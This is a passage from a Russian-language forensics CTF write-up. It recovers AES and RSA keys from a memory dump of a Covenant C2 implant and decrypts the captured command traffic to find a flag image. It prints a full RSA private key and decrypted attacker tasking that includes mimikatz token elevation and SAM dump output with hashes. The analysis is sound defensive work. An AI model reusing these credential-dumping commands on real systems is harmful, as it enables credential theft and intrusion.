File:        C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Core\v4.0_4.0.0.0__b77a5c561934e089\System.Core.dll
Fields:
              MT    Field   Offset                 Type VT     Attr            Value Name
00007ffaa40085a0  4000cf7       28         System.Int32  1 instance              128 BlockSizeValue
00007ffaa40085a0  4000cf8       2c         System.Int32  1 instance                8 FeedbackSizeValue
00007ffaa400aaa0  4000cf9        8        System.Byte[]  0 instance 000001f153484798 IVValue
00007ffaa400aaa0  4000cfa       10        System.Byte[]  0 instance 0000000000000000 KeyValue
00007ffaa403f990  4000cfb       18 ...graphy.KeySizes[]  0 instance 000001f153366b38 LegalBlockSizesValue
00007ffaa403f990  4000cfc       20 ...graphy.KeySizes[]  0 instance 000001f153366b78 LegalKeySizesValue
00007ffaa40085a0  4000cfd       30         System.Int32  1 instance              256 KeySizeValue
00007ffaa4044658  4000cfe       34         System.Int32  1 instance                1 ModeValue
00007ffaa4062b70  4000cff       38         System.Int32  1 instance                2 PaddingValue
00007ffaa403f990  4000be6      6f8 ...graphy.KeySizes[]  0   shared           static s_legalBlockSizes
                                 >> Domain:Value  000001f1506fd490:000001f153366b38 <<
00007ffaa403f990  4000be7      700 ...graphy.KeySizes[]  0   shared           static s_legalKeySizes
                                 >> Domain:Value  000001f1506fd490:000001f153366b78 <<
00007ffa9c6ddaa8  40005d4       40 ...les.SafeCspHandle  0 instance 000001f1533d8b70 m_cspHandle
00007ffa9c6ddbd8  40005d5       48 ...SafeCapiKeyHandle  0 instance 000001f1533d8c48 m_key
00007ffaa403f990  40005d2       c8 ...graphy.KeySizes[]  0   shared           static s_supportedKeySizes
                                 >> Domain:Value  000001f1506fd490:NotInit  <<
00007ffaa40085a0  40005d3      500         System.Int32  1   shared           static s_defaultKeySize
                                 >> Domain:Value  000001f1506fd490:NotInit  <<

```
- Видим такие типы объектов как SafeCapiKeyHandle и SafeCspHandle, выгрузим hex дамп по этим адресам:
```
0:000> db  000001f1533d8b70 L100
000001f1`533d8b70  a8 da 6d 9c fa 7f 00 00-a0 0a a0 6a f1 01 00 00  ..m........j....
000001f1`533d8b80  04 00 00 00 01 01 00 00-00 00 00 00 00 00 00 00  ................
000001f1`533d8b90  a0 aa 00 a4 fa 7f 00 00-20 00 00 00 00 00 00 00  ........ .......
000001f1`533d8ba0  17 cd 8c 53 d0 b0 64 61-86 81 89 13 c1 40 a2 01  ...S..da.....@..
000001f1`533d8bb0  bb 5c af ee 87 1e 9e 61-ad 94 cb 56 61 4b 27 51  .\.....a...VaK'Q
000001f1`533d8bc0  00 00 00 00 00 00 00 00-90 f9 03 a4 fa 7f 00 00  ................
000001f1`533d8bd0  01 00 00 00 00 00 00 00-98 6b 36 53 f1 01 00 00  .........k6S....
000001f1`533d8be0  00 00 00 00 00 00 00 00-a0 aa 00 a4 fa 7f 00 00  ................
000001f1`533d8bf0  2c 00 00 00 00 00 00 00-08 02 00 00 10 66 00 00  ,............f..
000001f1`533d8c00  20 00 00 00 17 cd 8c 53-d0 b0 64 61 86 81 89 13   ......S..da....
000001f1`533d8c10  c1 40 a2 01 bb 5c af ee-87 1e 9e 61 ad 94 cb 56  .@...\.....a...V
000001f1`533d8c20  61 4b 27 51 00 00 00 00-00 00 00 00 00 00 00 00  aK'Q............
000001f1`533d8c30  e8 6b 6e 9c fa 7f 00 00-08 02 00 00 10 66 00 00  .kn..........f..
000001f1`533d8c40  00 00 00 00 00 00 01 00-d8 db 6d 9c fa 7f 00 00  ..........m.....
000001f1`533d8c50  f0 7f ad 6a f1 01 00 00-04 00 00 00 01 01 00 00  ...j............
000001f1`533d8c60  a0 0a a0 6a f1 01 00 00-00 00 00 00 00 00 00 00  ...j............
```
В hex-дампе есть скопления байтов с высокой энтропией, размер которых равен 32, это и есть 256-битный AES ключ. 
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250812003742.png)
Найти ссылку на него можно и в других местах:
```
0:000> !gcroot 000001f1533d8b70
Thread e48:
    000000cc0364c100 00007ffa475a5e0b GruntExecutor.Grunt.Execute(System.String, System.String, System.String, System.Security.Cryptography.Aes)
        rbp-d8: 000000cc0364c208
            ->  000001f153495500 GruntExecutor.Grunt+<>c__DisplayClass0_0
            ->  000001f1534c8bc8 GruntExecutor.TaskingMessenger
            ->  000001f1534c8b80 GruntExecutor.MessageCrafter
            ->  000001f1533d8b18 System.Security.Cryptography.AesCryptoServiceProvider
            ->  000001f1533d8b70 Microsoft.Win32.SafeHandles.SafeCspHandle
```

Теперь, имея новый AES ключ, мы можем расшифровать всю коммуникацию. 

Однако вместо того чтобы делать это вручную, воспользуемся удобным скриптом decrypt_covenant_traffic.py из репозитория https://github.com/naacbin/CovenantDecryptor. В этом же репозитории есть скрипт для автоматического поиска приватного RSA ключа - extract_privatekey.py. 

Приведем также второй способ получить AES ключ с помощью этого скрипта:
- получим десятичное значение modulus из RSAkey
```python
print(int("baef5bee56f70040f48f9afea96e120d8942d0b64b3c5e5cacfc7d96459a7d967e1432b61ee2a712daa36fd5eef1712d73a19be1\d222e0354602348a0a93c14afceb9818bf9ea41b92e0559736efd65ee5a99118b4be33f0de7c606ad4ba1da37b228ab487c3265532e734f511eafbc\7229bca4abcc4fd7ab465d97bc5dbfa8a1c99bef60cfa07e26be75756fe43b25813af201d2aa06ce511cbb8d579c83cada830754363be8df2da4ad0\39d45113fcee76cfb423d69b136ea56be1a7470d02f2a3675f8c46a68565322aa24286a266851298e0cd90aecbdd87babfefa133b1b2ae5f1fbdb0b\98e517b7528e35fd9bf2359993e4ceb21b564f5c51d6962555d", 16))

23598357097748257459001522193279615790098243077434211990285035650037416854557487153041543839145873504364661260258258145982196047593600838968159942365710600229632038220683588355292857269827627629441531340138232479903170003517767232123855669480549375585351505061932112537018789849920931902515457411383729548626578732241492884821081722304066739713444522472711666829494339384950114089265103461609246287186252423812353162901012416073979549058886567219773030354506671620340699367692331670894450508006473829709777633739780055057830160764952533106717565747524530416092939471839209977509379614466680479399437631716767966582109
```
- и укажем его в качестве аргумента -m. Скрипт сохранит ключ в файл privkey1.pem. 
```powershell
C:\Users\User3\Downloads>python3 extract_privatekey.py -i powershell.DMP -m 23598357097748257459001522193279615790098243077434211990285035650037416854557487153041543839145873504364661260258258145982196047593600838968159942365710600229632038220683588355292857269827627629441531340138232479903170003517767232123855669480549375585351505061932112537018789849920931902515457411383729548626578732241492884821081722304066739713444522472711666829494339384950114089265103461609246287186252423812353162901012416073979549058886567219773030354506671620340699367692331670894450508006473829709777633739780055057830160764952533106717565747524530416092939471839209977509379614466680479399437631716767966582109 -o .
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[+] Saved private key C:\Users\User3\Downloads\privkey1.pem

C:\Users\User3\Desktop>type privkey1.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAuu9b7lb3AED0j5r+qW4SDYlC0LZLPF5crPx9lkWafZZ+FDK2
HuKnEtqjb9Xu8XEtc6Gb4dIi4DVGAjSKCpPBSvzrmBi/nqQbkuBVlzbv1l7lqZEY
tL4z8N58YGrUuh2jeyKKtIfDJlUy5zT1Eer7xyKbykq8xP16tGXZe8Xb+oocmb72
DPoH4mvnV1b+Q7JYE68gHSqgbOURy7jVecg8ragwdUNjvo3y2krQOdRRE/zuds+0
I9abE26la+GnRw0C8qNnX4xGpoVlMiqiQoaiZoUSmODNkK7L3Ye6v++hM7Gyrl8f
vbC5jlF7dSjjX9m/I1mZPkzrIbVk9cUdaWJVXQIDAQABAoIBAQCgb8RP13WgUx9S
jO0aDy0RTwf4RyxlQHt7wCwtJ8nDFcFZpnhmI5LO/LUey9aKg99FiaNW+doS4cYX
KG59S3iu2kl9PWhgSGqd8UmkQXMwYjvr/2rb3Q6JIPpQaf/vSHbBvNCcxpQ3txG8
G9hlq26x50McKG7BBugkIfG5aAQ3jo+7DOedGb9I3orPKup9GGx1QnXqlDgDO1oT
QAmVju9k0TFsIKR7euFZD7QIExVMWKzrzLQoIRTNsCyafWJciShMoy70EBG3KVvd
agj6r/Y7T/iTOk8mzLG0wC1LHjGwWlxjurqG3TagqP39w1t2EDAWAOBgCD+f9LSy
vqkNCERFAoGBAOUjVb399FqU1dR/plSusxXdIkszUBc/T1iCvLmaeCUouqCn4jFp
8905TnFeffTUmpUTqtdlOHA/XTg7R++KeN8nurA8nEG7KzKo0Zs/BCMLwgD1uPdk
xpN/fo43q6sk9EGG01iw1Al3aoXWXxaNRSdpZcj89jLT0EYIV9o9xLQ7AoGBANDZ
d+Th9k4neoDCUXRH88JocBkjWtci2wxwrTiUXQSXXzeQTy8ihrghcpLFQhm+7UhX
HdEmBNrxrw+zt0ZfM2NMcDmFxSapevG8QU7590D0SGRoR6Kb1a9NIMptL++jPvOz
Vx4BdkxhBKZHErBiQS8Tg5ye22ziA0QYp2gn9HtHAoGAaQsV14+AYbYxgMU0H0Yn
WzKQ8iCH6uBfI5hrpDqoMYDGbbgI/dYwsY3/5AEJhR+h7g2iGDSS9wJVXd3vUGUO
nF6+OuTOTWPcndC+pojxAI/3VDFRpjhQwHWGMvRago7iWtfQM6x8yAoyj0CDPvds
aHDs9ILi6tInfLN+ctI2RtkCgYEAvcoiLhk532P46zGrG+SXG8AUvoNmdcLzFKcA
gz4wGZAFs1Ss4MSbcJDUsZQYsZTTxL2GFx5Zoy2mTLqgfo7dAAvioCN0OeIiG7Nc
Fg0KKDjV4IjzME41LY0Fk28N9NOAza3YKShi/J3dv80uqqNfYQx2ucmS1au+FA/j
cb99aNkCgYEAvtrh1ZrMK86XCAy4XW9Xe+bxFPMmRqHxJClbqgR9ZB/uM/LFjS5S
paktUp3jlv61+E2AOIAbHFGM6zys0Bmc6bNwfNFuRsE+JRYb/PRHZGE9EBS0Vbs0
euo39HXAByl6QZotqxpIDk62nVJMTyfEs2RdThb3GHtJX2sD5aD8Qm0=
-----END RSA PRIVATE KEY-----
```

- получим новый AES ключ, расшифровав ответ C2 сервера на первый POST-запрос от Гранта, используя начальный AES ключ и приватный RSA ключ:
```shell
C:\Users\User3\Desktop>python3 decrypt_covenant_traffic.py key -i "formatted_c2_communication.txt" --key "l[REDACTED])=" -t base64 -r privkey1.pem -s 1

[+] New AES key : 17cd8c53d0b0646186818913c140a201bb5cafee871e9e61ad94cb56614b2751
```

Как видим, ключи совпали. Однако предварительно коммуникация должна быть правильно отформатирована для работы скрипта. 
1. Скрипт ищет ответы Grunt'a Covenant'у через регулярное выражение: 
`if line.startswith("i="): match = search(r"data=([^&]+)"`
Строка должна начинаться с `i=` и содержать `data=`. Скрипт берет все, что находится в поле data до знака &. 
2. Запросами сервера скрипт считает любые строки base64 после тэга `<html>`

Выделим http поток общения с Covenant сервером и сохраним его как txt файл. 
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250811023224.png)

Если ответы достаточно легко извлекаются, то с запросами могут возникнуть трудности, так как скрипт читает построчно:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250812031644.png)

Пример того, как может выглядеть итоговый файл без лишних строк:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250812030919.png)

Наконец, расшифруем всю коммуникацию новым AES ключом. Мы пропускаем первые 2 пакета, так как в них использовался старый AES и RSA ключи. Нумерация идет построчно:
```powershell
PS C:\Users\User3\Downloads> python3 decrypt_covenant_traffic.py decrypt -i formatted_c2_communication.txt -k "17cd8c53d0b0646186818913c140a201bb5cafee871e9e61ad94cb56614b2751" -t hex -s 2

[*] Response message 3 : p"A
[*] Request message 4 : cCIHQdnUsrA=
[*] Response message 5 : 2dSysA==
[*] Request message 6 :
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIAAAA=
[*] Response message 7 : { "integrity": 3, "process": "powershell", "userDomainName": "EVENTHORIZON", "userName":
"Administrator", "delay": 5, "jitter": 10, "connectAttempts": 5000, "status": 0, "ipAddress": "10.0.2.46", "hostname":
"WIN-SKOQ4PBDU0C", "operatingSystem": "Microsoft Windows NT 10.0.17763.0" }
[*] Request message 8 : {"type":"Tasks","name":"173729cfea","message":"9dfaa53aaa","token":false}
[*] Response message 9 :
[*] Request message 11 :
{"type":"Assembly","name":"592b050301","message":"7Xx9dFzVde+5d2bufEmyR2PNyJIljW1kjyVbSLKNIR8Fg0kgsYFgByQDtUfS2Mj.......","token":false}
[*] Response message 13 : {"status":"3","output":"EVENTHORIZON\\Administrator"}
[*] Request message 15 :
{"type":"Assembly","name":"74a53dc0d8","message":"nLdjkC5A0yX4tG3btn3btm3btm3btm3buG3rtu3ed+ab3ZmNjdjdmBOVkZkVWadO1o+MK..........","token":false}
[*] Response message 17 : {"status":"3","output":"\n  .#####.   mimikatz 2.2.0 (x64) #17763 Apr  9 2019 23:22:27\n .##
^ ##.  \"A La Vie, A L\u0027Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com
)\n ## \\ / ##       \u003e http://blog.gentilkiwi.com/mimikatz\n \u0027## v ##\u0027       Vincent LE TOUX
( vincent.letoux@gmail.com )\n  \u0027#####\u0027        \u003e http://pingcastle.com / http://mysmartlogon.com
***/\n\nmimikatz(powershell) # token::elevate\nToken Id  : 0\nUser name : \nSID name  : NT
AUTHORITY\\SYSTEM\n\n512\t{0;000003e7} 1 D 25303     \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tPrimary\n -\u003e
Impersonated !\n * Process Token : {0;0003218e} 1 D 3495847
\tEVENTHORIZON\\Administrator\tS-1-5-21-3056598854-1929938094-1148028849-500\t(18g,26p)\tPrimary\n * Thread Token  :
{0;000003e7} 1 D 3586856   \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tImpersonation
(Delegation)\n\nmimikatz(powershell) # lsadump::sam\nDomain : WIN-SKOQ4PBDU0C\nSysKey :
7d36208750229adfc967b493e2162f60\nLocal SID : S-1-5-21-2478979676-3632473970-4217322164\n\nSAMKey :
0284d0f07969f57a0b1f42fcea9af408\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM:
13[REDACTED])9f\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser :
DefaultAccount\n\nRID  : 000001f8 (504)\nUser : WDAGUtilityAccount\nERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH
revision (0)\nERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (0)\nERROR kuhl_m_lsadump_getHash ; Unknow
SAM_HASH revision (0)\nERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (0)\n"}
[*] Request message 19 :
{"type":"Assembly","name":"5776097386","message":"7Xx9fFzVdeB9b2bezJuRZI3GmpElSxp/yB5LtrCFwQ6Ugo0NdrENtY1tkYA.......","token":false}

```

В пакетах № 3-5 сервер и клиент обмениваются рандомными байтами, зашифрованными сессионным ключом, чтобы проверить, что ключ - симметричен и работает для обоих. В 6 пакете, сервер отправляет некий PE файл, скорее всего GruntExecutor, все закодированные в base64 строки здесь приведены сокращенными для читаемости. Остальные пакеты - выполняемые атакующим команды. Среди них есть NTLM хэш, дампнутый mimikatz:
`User:Administrator  Hash NTLM:13[REDACTED]9f`

### 6. What is the flag?

В последних двух пакетах передавалось изображение, что можно понять по сигнатурам. Берем начало расшифрованного пакета и декодируем фрагмент из base64. Строки base64 приведены сокращенными:
```powershell

PS C:\Users\User3\Downloads> python3 decrypt_covenant_traffic.py decrypt -i formatted_c2_communication.txt -k "17cd8c53d0b0646186818913c140a201bb5cafee871e9e61ad94cb56614b2751" -t hex -s 19
[*] Response message 21 :
{"status":"2","output":"iVBORw0KGgoAAAANSUhEUg..."
[*] Response message 23 :
{"status":"3","output":"VIj+wwAAb7RJREFU/9orr6hHHge..."

89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52    ‰PNG���IHDR
```

Воспользуемся простым скриптом для декодирования и записи потока байт в файл png:
```python
import base64

b64_string = """
iVBORw0KGgoAAAANSUhEUg.....
"""

output_path = "output.png"

data = base64.b64decode(b64_string)
with open(output_path, "wb") as f:
    f.write(data)
```

Если объединить две последние base64 строки, то получится вот такая картинка с флагом:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/output%20—%20копия.png)

### Ссылки
- https://github.com/naacbin/CovenantDecryptor
- https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs
